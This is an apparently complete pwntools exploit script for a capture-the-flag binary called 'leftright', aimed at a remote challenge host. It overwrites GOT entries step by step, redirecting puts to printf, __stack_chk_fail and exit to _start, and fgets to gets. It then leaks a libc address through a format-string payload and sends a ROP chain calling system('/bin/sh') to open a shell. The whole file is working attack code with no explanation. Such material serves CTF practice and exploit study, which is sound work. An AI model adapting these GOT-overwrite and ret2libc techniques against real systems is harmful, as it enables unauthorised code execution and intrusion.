#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or './leftright_patched')

host = args.HOST or 'challs.actf.co'
port = int(args.PORT or 31324)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)
gdbscript = '''
b *main+434
b *main+461
continue
'''.format(**locals())


# -- Exploit goes here --
libc = ELF('libc.leftright.6')


io = start()
io.recvuntil(b'Name:')
io.sendline(b'%p%p%p%p')
for i in range(255):
    print(i)
    io.sendline(b'1 '*0x100 )
    for i in range(0x100):
        io.recvline()


### PUTS to PRINTF
io.sendline(b'1 '*136 )
for i in range(136):
        io.recvline()
io.sendline(b'2')
io.sendline(b'\x76')

### stackcheckfail to start ###
io.sendline(b'1 '*8 )
for i in range(8):
        io.recvline()
io.sendline(b'2')
io.sendline(b'\xc0') # to START
# io.sendline(b'\x36') # to putchar

libc = ELF('libc.leftright.6')
### FGETS TO GETS
io.sendline(b'1 '*24 )
for i in range(24):
        io.recvline()
io.sendline(b'2')
io.sendline(b'\xa0')
io.sendline(b'1')
io.sendline(b'2')
io.sendline(b'\x35')


### set exit to _start exit
io.sendline(b'1 '*23 )
for i in range(23):
    io.recvline()

io.sendline(b'2')
io.sendline(b'\xc0')  # _start

io.sendline(b'1 '*64 )
for i in range(64):
    io.recvline()

io.sendline(b'0')

io.sendlineafter(b'Name: ', b"%13$p" + cyclic(27))
io.sendline(b'3')
io.recvuntil('bye')
leak = int(io.recvuntil(b"aa")[:-2], 16)
libc.address = leak - 0x29d90
log.success(f'libc address @ {hex(libc.address)}')

io.recvuntil("Name:")
rop2 = ROP(libc)
rop2.call(rop2.ret.address)
rop2.system(next(libc.search(b'/bin/sh\x00')))
io.sendline(b'A' * 40 + rop2.chain())

#round two
for i in range(255):
    print(i)
    io.sendline(b'1 '*0x100 )
    for i in range(0x100):
        io.recvline()


### stackcheckfail to putchar ###
io.sendline(b'1 '*144 )
for i in range(144):
        io.recvline()
io.sendline(b'2')
io.sendline(b'\x36') # to putchar

io.interactive()
